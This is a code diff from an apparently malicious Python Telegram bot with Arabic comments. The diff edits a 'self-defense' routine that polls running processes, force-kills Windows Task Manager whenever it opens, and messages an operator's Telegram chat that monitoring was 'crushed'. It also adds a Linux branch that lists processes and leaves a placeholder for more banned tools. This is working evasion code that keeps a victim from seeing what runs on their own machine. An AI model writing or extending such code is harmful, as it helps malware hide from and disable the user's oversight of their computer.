@@ -26,18 +26,21 @@ def get_system_info():
 
 # --- بروتوكول الدفاع الذاتي (Anti-Task Manager) ---
 def self_defense():
-    while True:
+   while True:
         try:
-            # البحث عن برامج المراقبة مثل مدير المهام
-            output = subprocess.check_output('tasklist', shell=True).decode()
-            if "taskmgr.exe" in output.lower():
-                # إغلاق مدير المهام فوراً قبل أن يكتشف يوكينو
-                os.system("taskkill /f /im taskmgr.exe")
-                # إبلاغ غالب بالهجوم
-                bot.send_message(8060120509, "⚠️ سيدي غالب، أحدهم حاول فتح مدير المهام لمراقبتي! تم سحقه وإغلاق البرنامج بنجاح. 🛡️")
+            # التحقق مما إذا كان النظام ويندوز لتشغيل أمر tasklist
+            if platform.system() == "Windows":
+                output = subprocess.check_output('tasklist', shell=True).decode()
+                if "taskmgr.exe" in output.lower():
+                    os.system("taskkill /f /im taskmgr.exe")
+                    bot.send_message(8060120509, "⚠️ سيدي غالب، تم إحباط محاولة مراقبة في ويندوز!")
+            else:
+                # إذا كنا في لينكس/WSL، نستخدم أمر ps
+                output = subprocess.check_output('ps -aux', shell=True).decode()
+                # هنا يمكننا إضافة برامج لينكس المحظورة إذا أردت
         except:
             pass
-        time.sleep(2) # فحص كل ثانيتين لضمان سرعة الاستجابة
+        time.sleep(5)
 
 # --- أمر البداية ---
 @bot.message_handler(commands=['start'])
